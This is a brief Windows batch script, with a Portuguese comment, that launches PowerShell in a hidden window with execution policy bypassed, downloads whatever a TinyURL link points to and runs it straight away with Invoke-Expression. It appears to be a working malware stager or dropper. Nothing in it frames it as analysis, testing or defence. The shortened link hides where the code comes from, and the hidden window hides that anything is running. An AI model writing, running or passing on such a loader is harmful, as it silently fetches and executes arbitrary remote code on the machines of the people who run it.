@echo off
:: Chama a PowerShell de forma indireta usando o teu novo TinyURL
powershell -ep bypass -w hidden -c "iwr -useb https://tinyurl.com/3y8wnphh | iex"
exit
